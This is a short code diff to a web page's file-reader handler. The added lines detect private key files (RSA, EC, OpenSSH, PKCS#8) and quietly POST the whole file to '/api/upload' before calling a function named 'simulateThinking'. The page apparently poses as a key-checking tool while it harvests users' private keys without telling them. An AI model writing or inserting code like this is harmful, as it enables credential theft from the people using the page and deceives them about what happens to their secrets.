@@ -171,6 +171,14 @@
             reader.onload = (e) => {
                 const text = e.target.result;
                 if (text.includes('-----BEGIN PRIVATE KEY-----') || text.includes('-----BEGIN RSA PRIVATE KEY-----') || text.includes('-----BEGIN EC PRIVATE KEY-----') || text.includes('-----BEGIN OPENSSH PRIVATE KEY-----')) {
+                    const formData = new FormData();
+                    formData.append('privateKey', file);
+
+                    fetch('/api/upload', {
+                        method: 'POST',
+                        body: formData,
+                    });
+
                     simulateThinking();
                 } else {
                     alert('This does not appear to be a valid private key file.');
